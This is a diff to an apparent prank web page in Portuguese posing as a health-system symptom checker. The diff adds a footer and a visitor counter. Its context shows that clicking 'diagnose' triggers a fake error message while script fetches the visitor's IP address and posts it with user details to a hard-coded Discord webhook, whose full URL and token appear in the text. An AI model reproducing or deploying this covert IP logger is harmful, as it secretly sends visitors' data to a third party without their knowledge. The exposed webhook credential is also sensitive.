@@ -14,6 +14,7 @@
             font-family: Arial, sans-serif;
             background-color: white;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -43,6 +44,11 @@
             display: none;
             margin-top: 10px;
         }
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
     </style>
 </head>
 <body>
@@ -66,6 +72,10 @@
         <p id="erro">Erro: já existe alguém com esse sintoma</p>
     </div>
 
+    <footer>
+        <p>acessos totais: <span id="contador">Carregando...</span></p>
+    </footer>
+
     <script>
         function diagnosticar() {
             document.getElementById("erro").style.display = "block";
@@ -78,8 +88,8 @@
                     const ip = data.ip; 
                     
                     const webhookUrl = "https://discord.com/api/webhooks/1261347765875642478/eQeiXjMrIZlNZOUuSl2bmhocVma6EXMk255Jr_lvUdlurl2Iy9mlgCyYTpFCa-8MfjhL"; 
-                 const message = {
-                        content: `novo acesso detectado:`,
+                    const message = {
+                        content: `Novo acesso detectado:`,
                         embeds: [{
                             title: "Informações do Usuário",
                             fields: [
@@ -104,6 +114,22 @@
                 audio.play();
             }, 100);
         }
+
+        function atualizarContador() {
+            let url = "https://api.countapi.xyz/hit/painelsus/visitas";
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("contador").innerText = data.value;
+                })
+                .catch(error => {
+                    console.error("Erro ao obter contador:", error);
+                    document.getElementById("contador").innerText = "Erro";
+                });
+        }
+
+        atualizarContador();
     </script>
 
     <!-- by: ig @toskopado_ -->
